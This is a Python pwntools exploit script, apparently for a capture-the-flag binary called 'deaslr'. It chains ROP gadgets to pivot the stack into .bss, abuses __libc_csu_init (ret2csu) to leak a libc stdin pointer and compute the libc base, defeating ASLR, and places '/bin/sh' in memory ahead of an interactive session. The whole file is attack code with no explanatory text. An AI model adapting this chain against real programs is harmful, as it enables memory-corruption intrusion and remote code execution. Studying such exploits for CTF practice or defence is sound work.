#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

from pwn import *
context.log_level = 'debug'

elf = ELF('./deaslr')
libc = ELF('/usr/lib/libc.so.6')

# ROP Gadgets
__libc_csu_init = elf.symbols['__libc_csu_init']
gadget1 = __libc_csu_init + 64  # mov rdx, r13; mov rsi, r14 ; mov edi, r15d ; call qword ptr [r12+rbx*8]
gadget2 = __libc_csu_init + 90  # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
gadget3 = 0x4005c3  # pop rdi ; ret
gadget4 = 0x4005bd  # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
gadget5 = 0x4005bc  # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
gadget6 = 0x40054f  # mov eax, 0x0 ; leave ; ret
gadget7 = __libc_csu_init + 94
gadget8 = 0x4004a0  # pop rbp ; ret

# Byte sequence alias
# usually only A8 is needed, but we can use different byte sequences to assist in debugging.
A8 = 8 * b'A'
B8 = 8 * b'B'
C8 = 8 * b'C'


def main():
    proc = elf.process()
    log.debug('You may attatch this process to gdb now.')
    raw_input()

    buf = elf.bss() + 0x100
    #bin_sh = 

    # migrate stack to .bss
    payload =  3 * A8                       # padding
    payload += p64(gadget3)                 # ret
    payload += p64(buf)                     # rdi
    payload += p64(elf.sym['gets'])         # ret
    payload += p64(gadget4)                 # ret
    payload += p64(buf)                     # rsp (new)
    proc.sendline(payload)

    # write to new stack (on .bss)
    payload =  3 * A8                       # padding
    payload += p64(elf.sym['main'])         # ret
    payload += 0x50 * b'\x00'               # padding to stage2 rop chain
    # file struct...
    payload += b'\x00' * 0x70 + p64(1) + p64(2) + b'\x00' * 0x70
    # stage2 rop chain is here...
    # r12 is &stdin (stdin is a symbol in libc)
    payload += p64(8)                       # r13 -> rdx (third arg) - write 8 bytes
    payload += p64(0x601118)                # r14 -> rsi (second arg) - contains the real address of stdin
    payload += p64(buf+24+8+0x50)           # r15 -> edi (first arg) - stdout
    payload += p64(gadget8)                 # ret
    payload += p64(0x79 + 1)                # rbp
    payload += p64(gadget1)                 # ret2csu
    payload += 7 * A8                       # padding
    payload += p64(gadget3)                 # ret
    payload += p64(0x6012f0)                # rdi
    payload += A8                           # ret
    payload += b'/bin/sh\x00'               # 0x6012f0
    proc.sendline(payload)

    # we execute main() again, but this time our stack is on .bss
    # note that main() will execute gets() again.
    payload =  3 * p64(0x601158)            # padding
    payload += p64(gadget3)                 # ret
    payload += p64(0x6010a8)                # rdi
    payload += p64(elf.sym['gets'])         # ret
    payload += p64(gadget3)                 # ret
    payload += p64(0x6010e0)                # rdi
    payload += p64(gadget6)                 # ret
    payload += p64(elf.sym['gets'])         # ret
    payload += p64(gadget4)                 # ret
    payload += p64(0x601090)                # rsp (new)
    proc.sendline(payload)

    #injected_rbx = p64(int( (libc.sym['_IO_file_write']-libc.sym['stdin']) / 8), signed=True)
    injected_rbx = p64(0x79)
    new_rsp = p64(buf + 24 + 8 + 0x50 + 0x70 + 8 + 8 + 0x70)
    proc.sendline(p64(gadget2) + injected_rbx)
    proc.sendline(p64(gadget4) + new_rsp)

    libc_stdin = u64(proc.recv(8))
    libc_base  = libc_stdin - 0x1c3610
    log.info('Leaked stdin@libc: {}'.format(hex(libc_stdin)))
    log.info('libc base address: {}'.format(hex(libc_base)))



    proc.interactive()



if __name__ == '__main__':
    main()
